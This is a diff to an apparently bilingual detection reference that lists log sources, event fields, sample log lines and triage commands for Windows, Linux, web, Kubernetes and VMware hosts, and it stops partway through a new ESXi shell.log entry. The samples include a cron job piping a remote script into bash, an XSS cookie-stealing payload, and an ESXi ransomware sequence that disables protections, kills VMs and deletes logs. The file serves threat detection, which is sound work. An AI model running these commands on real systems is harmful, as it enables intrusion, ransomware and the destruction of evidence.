@@ -100,7 +100,7 @@ Get-VIEvent -Start (Get-Date).AddDays(-1) -MaxSamples 5000 |
 "vc-sso":["vCenter SSO", "/var/log/audit/sso-events/audit_events.log; /var/log/vmware/sso/websso.log; /var/log/vmware/sso/vmware-identity-sts.log", "audit_events.log ghi dạng JSON từng dòng, phù hợp parse trên SIEM.", R`grep -E "LoginFailure|PrincipalManagement" /var/log/audit/sso-events/audit_events.log | tail -50`],
 "vc-file":["vCenter file log", "/var/log/vmware/vpxd/vpxd.log; /var/log/vmware/vsphere-ui/logs/; /var/log/vmware/applmgmt/ (VAMI); /var/log/vmware/vpxd-svcs/", "vpxd.log rất ồn; tìm theo opID để nối tác vụ từ UI tới host.", R`grep -E "BEGIN task-|vim.VirtualMachine.(powerOff|destroy)" /var/log/vmware/vpxd/vpxd.log | tail -50`],
 
-"esx-file":["ESXi file log", "/var/log/ → /scratch/log (symlink); /var/log/auth.log; /var/log/shell.log; /var/log/hostd.log; /var/log/vpxa.log; /var/log/vmkernel.log; /var/log/vobd.log; /var/log/syslog.log; /var/log/fdm.log; /var/log/esxupdate.log", "Nếu không có scratch persistent, log mất khi reboot. Luôn forward syslog: esxcli system syslog config set --loghost=udp://<siem>:514 && esxcli system syslog reload. ESXi 7.0U2+ có audit record: esxcli system auditrecords local enable / remote enable.", R`grep -E "Accepted|PAM|Authentication failure" /var/log/auth.log | tail
+"esx-file":["ESXi file log", "/var/log/ → /var/run/log/ (→ /scratch/log khi có scratch persistent); /var/log/auth.log; /var/log/shell.log; /var/log/hostd.log; /var/log/vpxa.log; /var/log/rhttpproxy.log; /var/log/envoy-access.log; /var/log/vobd.log; /var/log/vmkernel.log; /var/log/vmkwarning.log; /var/log/vmksummary.log; /var/log/syslog.log; /var/log/esxupdate.log; /var/log/sysboot.log; /var/log/boot.gz; /var/log/fdm.log; /var/log/hbrsrv.log; /var/log/dhclient.log; /var/log/usb.log; /var/log/nvmeauth.log; /var/log/watchdog.log; /var/log/vmsyslogd-dropped.log", "Nếu không có scratch persistent, log mất khi reboot. Luôn forward syslog: esxcli system syslog config set --loghost=udp://<siem>:514 && esxcli system syslog reload. ESXi 7.0U2+ có audit record: esxcli system auditrecords local enable / remote enable. vmsyslogd-dropped.log ghi các message syslog bị drop khi forward — kiểm tra khi SIEM thấy khoảng trống log.", R`grep -E "Accepted|PAM|Authentication failure" /var/log/auth.log | tail
 tail -100 /var/log/shell.log`],
 "esx-ev":["ESXi events (esx.audit.* / VOB)", "/var/log/vobd.log, hostd.log; đồng thời đẩy lên vCenter events", "Các ID esx.audit.* là nguồn tốt để cảnh báo thay đổi bảo mật trên host.", R`grep -E "esx\.audit\." /var/log/vobd.log | tail -50`]
 };
@@ -137,7 +137,7 @@ const EN_SRC = {
 "vc-ev":["vCenter events (vim.event.*)", "Event names look like vim.event.<Name> or com.vmware.*. When forwarded via syslog, the content lives in vpxd/vpxd-svcs.", "Stored in the vCenter DB; view under Monitor > Events; forward via VAMI https://<vcsa>:5480 > Syslog"],
 "vc-sso":["vCenter SSO", "audit_events.log is written as one JSON object per line, convenient to parse in a SIEM."],
 "vc-file":["vCenter file log", "vpxd.log is very noisy; search by opID to stitch a task from the UI through to the host."],
-"esx-file":["ESXi file log", "If there's no persistent scratch partition, logs are lost on reboot. Always forward syslog: esxcli system syslog config set --loghost=udp://<siem>:514 && esxcli system syslog reload. ESXi 7.0U2+ has audit records: esxcli system auditrecords local enable / remote enable.", "/var/log/ → /scratch/log (symlink); /var/log/auth.log; /var/log/shell.log; /var/log/hostd.log; /var/log/vpxa.log; /var/log/vmkernel.log; /var/log/vobd.log; /var/log/syslog.log; /var/log/fdm.log; /var/log/esxupdate.log"],
+"esx-file":["ESXi file log", "If there's no persistent scratch partition, logs are lost on reboot. Always forward syslog: esxcli system syslog config set --loghost=udp://<siem>:514 && esxcli system syslog reload. ESXi 7.0U2+ has audit records: esxcli system auditrecords local enable / remote enable. vmsyslogd-dropped.log records syslog messages dropped during forwarding — check it when the SIEM shows a log gap.", "/var/log/ → /var/run/log/ (→ /scratch/log when a persistent scratch exists); /var/log/auth.log; /var/log/shell.log; /var/log/hostd.log; /var/log/vpxa.log; /var/log/rhttpproxy.log; /var/log/envoy-access.log; /var/log/vobd.log; /var/log/vmkernel.log; /var/log/vmkwarning.log; /var/log/vmksummary.log; /var/log/syslog.log; /var/log/esxupdate.log; /var/log/sysboot.log; /var/log/boot.gz; /var/log/fdm.log; /var/log/hbrsrv.log; /var/log/dhclient.log; /var/log/usb.log; /var/log/nvmeauth.log; /var/log/watchdog.log; /var/log/vmsyslogd-dropped.log"],
 "esx-ev":["ESXi events (esx.audit.* / VOB)", "esx.audit.* IDs are a good source for alerting on security-relevant changes to a host.", "/var/log/vobd.log, hostd.log; also forwarded to vCenter events"]
 };
 
@@ -648,7 +648,6 @@ OperationType: Value Added / Value Deleted`,
  "Credential Manager bị đọc. Ồn với ứng dụng hợp lệ.","SubjectUserName: Tài khoản thực hiện đọc credential\nTargetName: Tên credential được truy vấn (vd. đích RDP/SMB đã lưu)\nType: Loại credential (1=Generic, 2=Domain Password...)\nCountOfCredentialsReturned: Số lượng credential trả về", R`EventID=5379 SubjectUserName=thanhnv TargetName=Domain:target=TERMSRV/SRV-DB01 Type=2 CountOfCredentialsReturned=1`, "Tiến trình lạ đọc nhiều credential trong thời gian ngắn.", ""],
 
 
-
 /* ===== Windows System ===== */
 ["win-sys","7045","Service mới được cài (System)","h","T1543.003",
  "Luôn có trong System, không cần bật audit. Nguồn tốt nhất để bắt PsExec, Impacket, Cobalt Strike tạo service.",
@@ -697,7 +696,6 @@ OperationType: Value Added / Value Deleted`,
  "Provider WindowsUpdateClient. Kiểm tra tình trạng vá.","updateTitle: Tên bản cập nhật\nupdateGuid: GUID định danh bản cập nhật\nupdateRevisionNumber: Số revision của bản cập nhật\nerrorCode: Mã lỗi cài đặt (chỉ có ở event 20 khi thất bại)", R`EventID=19 Provider=Microsoft-Windows-WindowsUpdateClient updateTitle=2026-10 Cumulative Update for Windows Server 2022 (KB50xxxxx)`, "", ""],
 
 
-
 /* ===== Defender ===== */
 ["win-def","1116","Phát hiện malware","h","",
  "Defender phát hiện mối đe dọa.", "Threat Name, Path, Process Name, Detection User", R`EventID=1116 ThreatName=HackTool:Win64/Mimikatz!pz Severity=High Path=file:_C:\Users\Public\m.exe ProcessName=C:\Windows\explorer.exe DetectionUser=CORP\thanhnv`, "Tên HackTool:*, Behavior:*, Trojan:Win32/CobaltStrike trên server.", ""],
@@ -723,7 +721,6 @@ OperationType: Value Added / Value Deleted`,
  "Có kẻ cố đổi cấu hình bảo vệ nhưng bị chặn.","Value: Đường dẫn registry/setting mà kẻ tấn công cố thay đổi nhưng bị chặn\nOld Value: Giá trị cũ của setting\nNew Value: Giá trị mới mà thao tác cố ghi vào (bị chặn)", R`EventID=5013 Value=HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring`, "Dấu hiệu rõ của ý đồ tắt AV.", ""],
 
 
-
 /* ===== PowerShell ===== */
 ["win-ps","4104","Script Block Logging","h","T1059.001",
  "Ghi nội dung script đã được giải mã (kể cả -EncodedCommand). Script có từ khóa đáng ngờ được ghi ở mức Warning kể cả khi chưa bật.",
@@ -742,7 +739,6 @@ OperationType: Value Added / Value Deleted`,
 
 ["win-ps","800","Pipeline execution (classic log)","i","",
  "Chi tiết thực thi pipeline khi bật module logging.","CommandLine: Toàn bộ dòng lệnh/pipeline được thực thi\nCommandName: Tên cmdlet hoặc lệnh trong pipeline\nHostApplication: Tiến trình host chạy PowerShell (vd powershell.exe)\nEngineVersion: Phiên bản PowerShell engine\nRunspaceId / PipelineId: Định danh runspace và pipeline, dùng để liên kết các sự kiện 800 cùng một lệnh", R`EventID=800 CommandLine=Get-ADUser -Filter * -Properties ServicePrincipalName`, "", ""],
-
 
 
 /* ===== Sysmon ===== */
@@ -820,7 +816,6 @@ CallTrace chứa UNKNOWN hoặc dbghelp.dll/dbgcore.dll: đáng ngờ`,
  "Image trong bộ nhớ khác file trên đĩa: process hollowing, herpaderping.","Image: Tiến trình bị phát hiện tampering\nProcessId / ProcessGuid: Định danh tiến trình bị tác động\nType: Loại tampering (vd \"Image is replaced\" cho process hollowing, \"Process Herpaderping\")\nUser: Tài khoản sở hữu tiến trình", R`EventID=25 Image=C:\Windows\System32\svchost.exe Type=Image is replaced`, "", ""],
 
 
-
 /* ===== RDP ===== */
 ["win-rdp","1149","RDP: xác thực mạng thành công","m","T1021.001",
  "RemoteConnectionManager. Ghi khi kết nối mạng RDP được chấp nhận (NLA), trước khi logon thực sự.","User: Tài khoản xác thực NLA thành công\nDomain: Domain của tài khoản\nSourceNetworkAddress: Địa chỉ IP máy nguồn thực hiện kết nối RDP", R`EventID=1149 User=adm_thanh Domain=CORP SourceNetworkAddress=10.20.5.23`, "IP nguồn ngoài jump host/PAM được phép.", ""],
@@ -842,7 +837,6 @@ CallTrace chứa UNKNOWN hoặc dbghelp.dll/dbgcore.dll: đáng ngờ`,
  "Trên máy nguồn, ghi máy đích mà user RDP tới. Hữu ích để lần đường lateral movement.","Message: Nội dung mô tả sự kiện (free-text), chứa tên/địa chỉ máy chủ đích mà RDP ActiveX client đang kết nối tới - ghi trên máy nguồn nên hữu ích để truy vết lateral movement", R`EventID=1024 Message=RDP ClientActiveX is trying to connect to the server (SRV-DB01)`, "", ""],
 
 
-
 /* ===== Task Scheduler ===== */
 ["win-task","106","Đăng ký task","m","T1053.005",
  "Task mới được đăng ký.","TaskName: Đường dẫn đầy đủ của task (gồm cả thư mục cha) vừa được đăng ký\nUserContext: Tài khoản đã đăng ký task", R`EventID=106 TaskName=\UpdateCheck UserContext=CORP\thanhnv`, "", ""],
@@ -854,7 +848,6 @@ CallTrace chứa UNKNOWN hoặc dbghelp.dll/dbgcore.dll: đáng ngờ`,
 
 ["win-task","129/200/201","Task khởi chạy tiến trình / action","i","",
  "129 khởi tạo tiến trình, 200 bắt đầu action, 201 hoàn tất action.","TaskName: Đường dẫn task đang chạy\nActionName: Hành động/chương trình được chỉ định chạy (vd đường dẫn powershell.exe)\nTaskInstanceId: GUID định danh một lần thực thi, dùng để nối các sự kiện 129/200/201 cùng một lần chạy\nResultCode: Mã kết quả trả về khi action hoàn tất (chỉ ID 201)", R`EventID=200 TaskName=\UpdateCheck ActionName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TaskInstanceId={...}`, "", ""],
-
 
 
 /* ===== Others ===== */
@@ -884,7 +877,6 @@ CallTrace chứa UNKNOWN hoặc dbghelp.dll/dbgcore.dll: đáng ngờ`,
 
 ["win-oth","DS 2889","LDAP bind không ký","m","T1557",
  "Directory Service log trên DC: client bind LDAP không ký hoặc simple bind cleartext.","Client IP Address: Địa chỉ IP:port của client thực hiện bind LDAP\nIdentity: Danh tính (domain\\user) mà client dùng để xác thực\nBinding Type: Loại bind không an toàn - 0 = SASL không ký, 1 = simple bind không mã hóa (cleartext)", R`EventID=2889 ClientIP=10.40.2.15:50122 Identity=CORP\svc_scanner BindingType=0`, "BindingType 0 = unsigned SASL; 1 = simple bind không TLS (mật khẩu rõ).", ""],
-
 
 
 /* ===== Linux auth ===== */
@@ -950,7 +942,6 @@ Oct 24 09:20:30 app01 usermod[22320]: add 'sysbackup' to shadow group 'wheel'`, 
 Oct 24 09:12:44 app01 systemd-logind[812]: New session 42 of user root.`, "", ""],
 
 
-
 /* ===== Linux system ===== */
 ["lin-sys","CRON CMD","Cron thực thi lệnh","m","T1053.003",
  "Mỗi lần cron chạy job.","CRON[pid]: PID tiến trình cron con thực thi job\n(user): tài khoản mà crontab thuộc về và lệnh chạy dưới quyền đó\nCMD: nội dung đầy đủ của lệnh/job được cron thực thi", R`Oct 24 03:00:01 app01 CRON[3321]: (root) CMD (curl -fsSL http://203.0.113.7/a.sh | bash)`, "curl/wget pipe tới sh/bash, lệnh base64 -d, job chạy mỗi phút từ thư mục /tmp, /dev/shm. Trên RHEL/CentOS, dòng CRON nằm ở /var/log/cron (không phải /var/log/messages); trên Debian/Ubuntu xuất hiện ở /var/log/syslog và /var/log/cron.log.", ""],
@@ -1002,7 +993,6 @@ Requested-By: thanhnv (1001)
 Install: nmap:amd64 (7.94), socat:amd64 (1.7.4)`, "Công cụ tấn công/pivot được cài trên server: nmap, socat, netcat, masscan, proxychains.", ""],
 
 
-
 /* ===== Linux account files ===== */
 ["lin-acct","wtmp (last)","Lịch sử đăng nhập/đăng xuất","i","T1078",
  "Phiên thành công, reboot, shutdown.", "ut_type: loại bản ghi (LOGIN_PROCESS/USER_PROCESS=đăng nhập, DEAD_PROCESS=đăng xuất, BOOT_TIME/RUN_LVL=reboot/shutdown)\nut_user: username (rỗng khi đăng xuất)\nut_line: tty/pts\nut_host: host nguồn (SSH) hoặc version kernel (bản ghi boot)\nut_tv: thời điểm", R`root     pts/0        10.30.1.99       Sat Oct 24 09:12:44 2026 - Sat Oct 24 10:02:11 2026  (00:49)
@@ -1021,7 +1011,6 @@ www-data         pts/1    10.30.1.99       Sat Oct 24 09:30:02 +0700 2026`, "", 
 ["lin-acct","utmp (who/w)","Phiên đăng nhập hiện tại","i","",
  "Danh sách phiên đăng nhập đang hoạt động trên hệ thống.", "ut_user: username đang đăng nhập\nut_line: tty/pts\nut_pid: PID của tiến trình login/shell\nut_host: host nguồn nếu đăng nhập từ xa\nut_tv: thời điểm đăng nhập", R`root     pts/0        2026-10-24 09:12   .          1234 (10.30.1.99)
 oracle   pts/1        2026-10-24 09:30   00:05      1240 (10.30.1.99)`, "So sánh với auth.log/wtmp; tiến trình cố tình không ghi vào utmp (session ẩn) là kỹ thuật chống điều tra thường gặp.", "who -u"],
-
 
 
 /* ===== auditd ===== */
@@ -1206,31 +1195,6 @@ aureport --anomaly -i`],
 ["lin-audit","ANOM_LINK","Symlink/hardlink đáng ngờ bị chặn","m","T1068","Ghi khi phát hiện sử dụng link file đáng ngờ. Kernel ghi khi fs.protected_symlinks / fs.protected_hardlinks chặn việc đi theo symlink hoặc tạo hardlink không an toàn (thường trong thư mục sticky như /tmp) — dấu hiệu thử khai thác symlink/race để leo quyền.","op: follow_link (đi theo symlink bị chặn) hoặc linkat (tạo hardlink bị chặn)\nauid / uid / euid: UID đăng nhập gốc, UID thật và UID hiệu lực của tiến trình\ncomm / exe: tiến trình truy cập link\nPATH name / mode / ouid: link bị chặn, kiểu file (0120777 = symlink) và chủ sở hữu link\nres: 0 = bị từ chối","type=ANOM_LINK msg=audit(1729737700.800:5250): op=follow_link ppid=24100 pid=24120 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=\"logrotate\" exe=\"/usr/sbin/logrotate\" res=0\ntype=PATH msg=audit(1729737700.800:5250): item=0 name=\"/tmp/app.log\" inode=393300 dev=fd:00 mode=0120777 ouid=1001 ogid=1001 rdev=00:00 nametype=NORMAL","Tiến trình chạy bằng root (cron, logrotate, script backup) bị chặn khi đi theo symlink do user thường (ouid >= 1000) tạo trong /tmp: dấu hiệu thử tấn công symlink để ghi đè file hệ thống.","ausearch -m ANOM_LINK -i --start today\nsysctl fs.protected_symlinks fs.protected_hardlinks"],
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 /* ===== Web access ===== */
 ["web-acc","combined","Cấu trúc dòng log combined","i","",
  "Đọc từ trái sang: IP client, ident, user, thời gian, request line, status, bytes, Referer, User-Agent.", R`$remote_addr: IP client (sau LB thì cần X-Forwarded-For)
@@ -1259,7 +1223,6 @@ $body_bytes_sent: kích thước phản hồi, hữu ích để phát hiện rò
  "Mặc định pattern common (không có UA). Nên đổi sang combined và thêm %D (thời gian ms).","%h: 10.20.5.23 - IP nguồn request\n%t: [24/Oct/2026:09:12:44 +0700] - thời điểm nhận request\n\"%r\": \"POST /ttnt-iam/login HTTP/1.1\" - method và đường dẫn login của ứng dụng Java\n%s: 302 - mã trạng thái (redirect sau xử lý đăng nhập)\n%b: \"-\" - không có nội dung phản hồi\ntrường cuối (41): thời gian xử lý request, tính bằng mili-giây (kiểu %D/%T tùy cấu hình); pattern \"common\" mặc định KHÔNG có User-Agent nên khó nhận diện công cụ tấn công", R`10.20.5.23 - - [24/Oct/2026:09:12:44 +0700] "POST /ttnt-iam/login HTTP/1.1" 302 - 41`, "", ""],
 
 
-
 /* ===== IIS ===== */
 ["web-iis","W3C fields","Cấu trúc log IIS","i","",
  "Thứ tự cột theo dòng #Fields: trong file.", R`sc-status / sc-substatus: mã và mã con
@@ -1285,7 +1248,6 @@ cs-username: user nếu có xác thực Windows/Basic`,
 
 ["web-iis","aspx webshell","POST tới file .aspx lạ","h","T1505.003",
  "Webshell thường nằm trong thư mục ít dùng và chỉ một IP truy cập.","cs-method: POST\ncs-uri-stem: /aspnet_client/system_web/err.aspx - file .aspx lạ nằm trong thư mục hệ thống ít khi chứa nội dung tùy biến\ncs-uri-query: \"-\" - không có tham số truy vấn\nc-ip: 203.0.113.7 - chỉ một IP duy nhất truy cập file này\ncs(User-Agent): \"-\" - trống, bất thường với truy cập ứng dụng web thông thường\nsc-status: 200 - truy cập/thực thi thành công", R`2026-10-24 02:31:40 10.10.1.20 POST /aspnet_client/system_web/err.aspx - 443 - 203.0.113.7 - - 200 0 0 102`, "File .aspx chỉ một IP gọi, không có Referer, chủ yếu POST; tiến trình w3wp.exe sinh cmd/powershell trên cùng thời điểm.", ""],
-
 
 
 /* ===== Attack patterns ===== */
@@ -1326,7 +1288,6 @@ cs-username: user nếu có xác thực Windows/Basic`,
 
 ["web-atk","XSS","Cross-site scripting","m","T1190",
  "Thẻ script hoặc event handler trong tham số.","\"%r\": \"GET /search?q=<script>alert(document.cookie)</script>\" - tham số q chứa thẻ <script> (URL-encoded) được phản chiếu lại trong trang kết quả (reflected XSS)\n%>s: 200 - server phản hồi bình thường, không lọc/escape payload\n%b: 2210 - kích thước trang trả về có chứa payload\nUser-Agent: Mozilla/5.0 - truy cập từ trình duyệt thật", R`10.30.1.99 - - [24/Oct/2026:09:50:00 +0700] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1" 200 2210 "-" "Mozilla/5.0"`, "<script, onerror=, javascript:, %3Csvg.", ""],
-
 
 
 /* ===== K8s audit ===== */
@@ -1383,7 +1344,6 @@ volumes.hostPath.path=/ hoặc /var/run/docker.sock`, R`{"verb":"create","user":
  "Persistence chạy trên mọi node hoặc theo lịch.","verb: \"create\"\nuser.username: tài khoản thực hiện tạo workload\nobjectRef.resource/apiGroup: resource=\"daemonsets\" (apiGroup=\"apps\") hoặc \"cronjobs\" (apiGroup=\"batch\")\nobjectRef.namespace: \"kube-system\" — namespace nhạy cảm, workload chạy trên mọi node hoặc theo lịch với quyền cao\nobjectRef.name: tên object được tạo\nresponseStatus.code: 201 — tạo thành công", R`{"verb":"create","user":{"username":"thanhnv"},"objectRef":{"resource":"daemonsets","apiGroup":"apps","namespace":"kube-system","name":"node-helper"},"responseStatus":{"code":201}}`, "", ""],
 
 
-
 /* ===== K8s component ===== */
 ["k8s-comp","kubelet","kubelet log","i","",
  "journald trên node; klog format.","Oct 24 02:11:05 worker-01: timestamp và tên node do journald/syslog gắn vào\nkubelet[1422]: tên tiến trình và PID của kubelet trên node\nE1024 02:11:05.123456: ký tự đầu là mức log klog (E=Error, I=Info, W=Warning, F=Fatal), theo sau là ngày giờ nội bộ\nthreadid (\"1422\" sau timestamp): mã luồng ghi log của klog\npod_workers.go:1298: file mã nguồn và dòng phát sinh log\nmessage/err/pod: nội dung log và các trường ngữ cảnh — ở đây cho biết pod/container nào lỗi (CrashLoopBackOff)", R`Oct 24 02:11:05 worker-01 kubelet[1422]: E1024 02:11:05.123456    1422 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"api\" with CrashLoopBackOff" pod="payment/api-7d9f"`, "Kubelet API (10250) không log request mặc định; bảo vệ bằng --anonymous-auth=false và --authorization-mode=Webhook.", R`journalctl -u kubelet --since "1 hour ago" --no-pager | tail -100`],
@@ -1405,7 +1365,6 @@ volumes.hostPath.path=/ hoặc /var/run/docker.sock`, R`{"verb":"create","user":
  "journalctl -u containerd hoặc crio.","time: thời gian theo chuẩn RFC3339 do containerd ghi\nlevel: mức log (info/warn/error)\nmsg: hành động được thực hiện (vd \"PullImage\")\ntên image/đối tượng trong msg: image hoặc container liên quan tới hành động (vd \"docker.io/library/alpine:latest\")", R`Oct 24 02:11:00 worker-01 containerd[980]: time="2026-10-24T02:11:00.501Z" level=info msg="PullImage \"docker.io/library/alpine:latest\""`, "", ""],
 
 
-
 /* ===== K8s events ===== */
 ["k8s-ev","Pulled (registry lạ)","Kéo image từ registry ngoài danh sách","h","T1610, T1496",
  "Event Normal nhưng có giá trị bảo mật.","NAMESPACE: namespace chứa object liên quan (involvedObject.namespace)\nLAST SEEN: thời gian kể từ lastTimestamp của event (lastTimestamp/count)\nTYPE: loại event — Normal/Warning\nREASON: lý do ngắn gọn (\"Pulled\")\nOBJECT: kind/name của involvedObject liên quan\nMESSAGE: nội dung chi tiết — ở đây ghi rõ registry và tên image được kéo về (cần đối chiếu danh sách registry được phép)", R`NAMESPACE  LAST SEEN  TYPE    REASON  OBJECT          MESSAGE
@@ -1422,7 +1381,6 @@ payment    2m         Normal  Pulled  pod/x-5b8c      Successfully pulled image 
 
 ["k8s-ev","OOMKilling / Evicted","Container bị kill do bộ nhớ / pod bị evict","m","T1496",
  "Có thể do cryptominer hoặc DoS.","NAMESPACE: namespace của pod bị ảnh hưởng\nLAST SEEN: thời gian kể từ lần event cuối được ghi nhận\nTYPE: \"Warning\"\nREASON: \"Evicted\" (hoặc OOMKilling) — pod/container bị kill do thiếu tài nguyên\nOBJECT: pod liên quan (involvedObject)\nMESSAGE: lý do cụ thể — ngưỡng tài nguyên và lượng còn khả dụng tại thời điểm evict", R`payment  5m  Warning  Evicted  pod/api-7d9f  The node was low on resource: memory. Threshold quantity: 100Mi, available: 81Mi.`, "", ""],
-
 
 
 /* ===== vCenter events ===== */
@@ -1479,7 +1437,6 @@ esx.audit.shell.enabled: The ESXi command line shell has been enabled.`, "SSH b�
  "vim.event.HostConnectionLostEvent / HostDisconnectedEvent.","host: ESXi host bị mất kết nối\ndatacenter: datacenter chứa host\nfullFormattedMessage: nội dung mô tả (host is not responding)\ncreatedTime: thời điểm phát hiện mất kết nối\nuserName: thường rỗng vì đây là sự kiện hệ thống tự phát hiện", R`vim.event.HostConnectionLostEvent: Host esx-dc-03.corp.local in DC-HN is not responding`, "", ""],
 
 
-
 /* ===== vCenter SSO ===== */
 ["vc-sso","LoginFailure","SSO đăng nhập thất bại","h","T1110",
  "audit_events.log, JSON mỗi dòng.","user: tài khoản SSO đăng nhập (vd administrator@vsphere.local)\nclient: IP nguồn thực hiện đăng nhập\ntimestamp: thời điểm sự kiện (giờ GMT)\ndescription: nội dung chi tiết, gồm user@IP và lý do thất bại (vd Invalid credentials)\ntype: loại sự kiện SSO (com.vmware.sso.LoginFailure)\neventSeverity: mức độ (thường INFO ngay cả khi login thất bại)", R`{"user":"administrator@vsphere.local","client":"10.30.1.99","timestamp":"10/24/2026 02:20:11 GMT","description":"User administrator@vsphere.local@10.30.1.99 failed to log in: Invalid credentials","eventSeverity":"INFO","type":"com.vmware.sso.LoginFailure"}`, "", ""],
@@ -1493,7 +1450,6 @@ esx.audit.shell.enabled: The ESXi command line shell has been enabled.`, "SSH b�
  "Tạo user local SSO, thêm vào nhóm Administrators.","user: tài khoản thực hiện thao tác quản trị SSO (actor)\nclient: IP nguồn thực hiện thao tác\ndescription: nội dung thao tác (vd thêm principal vào group Administrators)\ntype: com.vmware.sso.PrincipalManagement\ntimestamp: thời điểm thực hiện", R`{"user":"administrator@vsphere.local","client":"10.30.1.99","description":"Add principal svcbk@vsphere.local to group Administrators","type":"com.vmware.sso.PrincipalManagement"}`, "User vsphere.local mới, nhất là được thêm vào Administrators.", ""],
 
 
-
 /* ===== vCenter files ===== */
 ["vc-file","vpxd.log","Log dịch vụ vCenter (vpxd)","i","",
  "Mỗi tác vụ có BEGIN/FINISH task kèm opID.","timestamp: thời gian ghi log (ISO8601, có timezone)\nloglevel/process[pid]: mức log (info/warning/error) và tiến trình vpxd kèm PID\nsub=: subsystem phát sinh log (vd vpxLro = long-running operation)\nopID=: operation ID, dùng để nối các dòng log liên quan tới cùng thao tác qua nhiều service\ntask-NNNN: ID tác vụ vCenter (BEGIN/FINISH đánh dấu bắt đầu/kết thúc)\nvim.VirtualMachine.powerOff: tên API/operation được gọi, kèm moref đối tượng (vm-1021) và UUID actor/session", R`2026-10-24T02:15:01.234+07:00 info vpxd[12345] [Originator@6876 sub=vpxLro opID=lro-881232] [VpxLRO] -- BEGIN task-91234 -- vm-1021 -- vim.VirtualMachine.powerOff -- 52e1a3c4-...(52f3b1aa-...)`, "Dùng opID để nối hành động trên UI với hostd.log trên ESXi.", ""],
@@ -1503,47 +1459,50 @@ esx.audit.shell.enabled: The ESXi command line shell has been enabled.`, "SSH b�
  "Log hệ điều hành Photon của VCSA; vị trí cụ thể phụ thuộc phiên bản (journald, /var/log/messages, /var/log/audit/).","timestamp: thời gian ghi log (định dạng syslog)\nhostname: tên appliance VCSA (vd vcsa01)\nprocess[pid]: tiến trình sshd và PID xử lý kết nối\nAccepted/Failed password/publickey for: kết quả xác thực và tài khoản đăng nhập (vd root)\nfrom <IP> port <port>: IP nguồn và cổng kết nối\nssh2: giao thức phiên", R`Oct 24 02:30:01 vcsa01 sshd[30211]: Accepted password for root from 10.30.1.99 port 50211 ssh2`, "SSH vào VCSA ngoài quy trình; lệnh lạ trong bash history của root.", R`journalctl -u sshd --no-pager | tail -50`],
 
 
-
 /* ===== ESXi files ===== */
-["esx-file","auth.log success","SSH vào ESXi thành công","m","T1021.004",
- "/var/log/auth.log.","timestamp: Thời điểm sự kiện (UTC, ISO 8601) ở đầu dòng auth.log\nsshd[pid]: Tiến trình SSH daemon và PID xử lý phiên đăng nhập\nAccepted <method>: Xác thực thành công và phương thức dùng (keyboard-interactive/pam, publickey, password...)\nfor <user>: Tài khoản dùng để đăng nhập (vd. root)\nfrom <IP>: Địa chỉ IP nguồn thực hiện kết nối SSH\nport <port> ssh2: Cổng TCP nguồn phía client và giao thức SSH2", R`2026-10-24T02:31:00Z sshd[2101012]: Accepted keyboard-interactive/pam for root from 10.30.1.99 port 50322 ssh2`, "", ""],
+["esx-file","auth.log","Đăng nhập SSH vào ESXi (thành công / thất bại)","h","T1021.004, T1110","/var/log/auth.log ghi xác thực ESXi Shell/SSH: dòng Accepted khi đăng nhập thành công, dòng PAM: Authentication failure khi sai mật khẩu hoặc tài khoản không hợp lệ.","timestamp: Thời điểm sự kiện (UTC, ISO 8601) ở đầu dòng\nsshd[pid]: Tiến trình SSH daemon và PID xử lý phiên\nAccepted <method>: Xác thực thành công và phương thức dùng (keyboard-interactive/pam, publickey, password...)\nerror: PAM: Authentication failure: Xác thực thất bại\nfor <user>: Tài khoản đăng nhập (vd. root)\nfrom <IP>: Địa chỉ IP nguồn của kết nối SSH\nport <port> ssh2: Cổng TCP nguồn phía client và giao thức SSH2",R`2026-10-24T02:30:41Z sshd[2101010]: error: PAM: Authentication failure for root from 10.30.1.99
+2026-10-24T02:31:00Z sshd[2101012]: Accepted keyboard-interactive/pam for root from 10.30.1.99 port 50322 ssh2`,"Nhiều lần thất bại rồi một lần Accepted từ cùng IP là dấu hiệu brute-force thành công; SSH thành công từ IP ngoài dải quản trị cần điều tra ngay.",R`grep -E "Accepted|PAM: Authentication failure" /var/log/auth.log | tail -50`],
 
+["esx-file","shell.log","Lệnh ESXi Shell (chuỗi tấn công ransomware)","c","T1021.004, T1562.004, T1529, T1486, T1105, T1059.004, T1562.001, T1037.004, T1053.003, T1562.006, T1070.002","/var/log/shell.log ghi từng lệnh gõ trong ESXi Shell (SSH hoặc DCUI). Đây là nguồn quan trọng nhất để dựng lại hoạt động của attacker trên host: bật SSH và mở firewall, liệt kê và tắt VM, tải và chạy encryptor, tắt execInstalledOnly, cài persistence, rồi xóa log và ngắt forward syslog.","timestamp: Thời điểm thực thi lệnh (UTC), mỗi dòng là một lệnh\nshell[pid]: Tiến trình ESXi Shell (busybox) và PID của phiên (cùng PID = cùng phiên)\n[user]: Tài khoản gõ lệnh (vd. root)\nvim-cmd hostsvc/enable_ssh, start_ssh: Bật và khởi động dịch vụ SSH\nesxcli network firewall ruleset set --ruleset-id=<name> --enabled=true --allowed-all=true: Bật ruleset firewall và cho mọi IP nguồn truy cập\nvim-cmd vmsvc/getallvms, esxcli vm process list: Liệt kê VM\nesxcli vm process kill --type=force --world-id=<id>: Buộc tắt VM theo world ID, không chờ tắt bình thường\nwget/curl/scp, chmod +x, nohup ... &: Tải binary vào host, cấp quyền thực thi và chạy nền\nesxcli system settings kernel set -s execInstalledOnly -v FALSE: Tắt kiểm soát chỉ cho chạy binary từ VIB, cho phép chạy encryptor tự mang vào\n/etc/rc.local.d/local.sh, /var/spool/cron/crontabs/root: Script chạy lúc boot và crontab của root, nơi cài persistence\n/sbin/auto-backup.sh: Ép ghi cấu hình vào bootbank để thay đổi tồn tại qua reboot\nesxcli system syslog config set --loghost='': Xóa cấu hình remote syslog, ngắt forward log\nrm -f /var/log/*.log: Xóa file log cục bộ",R`2026-10-24T02:28:20Z shell[2102001]: [root]: vim-cmd hostsvc/enable_ssh
+2026-10-24T02:28:21Z shell[2102001]: [root]: vim-cmd hostsvc/start_ssh
+2026-10-24T02:30:50Z shell[2102001]: [root]: esxcli network firewall ruleset set --ruleset-id=sshServer --enabled=true --allowed-all=true
